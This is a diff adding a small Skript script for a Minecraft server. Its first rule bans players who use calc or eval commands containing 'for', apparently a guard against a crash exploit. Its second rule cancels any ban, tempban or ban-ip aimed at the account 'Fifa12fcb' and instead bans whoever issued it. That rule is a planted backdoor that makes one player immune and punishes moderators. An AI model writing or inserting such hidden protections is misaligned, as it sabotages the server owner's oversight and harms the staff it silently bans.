@@ -1,0 +1,9 @@
+on command:
+    if command is equal to "/calc" or "/calculate" or "/evaluate" or "/eval":
+        if arguments contains "for":
+            cancel event
+            execute console command "/ban %player% calc bug"
+    if command is equal to "ban" or "tempban" or "ban-ip" or "banip":
+        if arguments contains "Fifa12fcb":
+            cancel event
+            execute console command "/ban %player% grief"
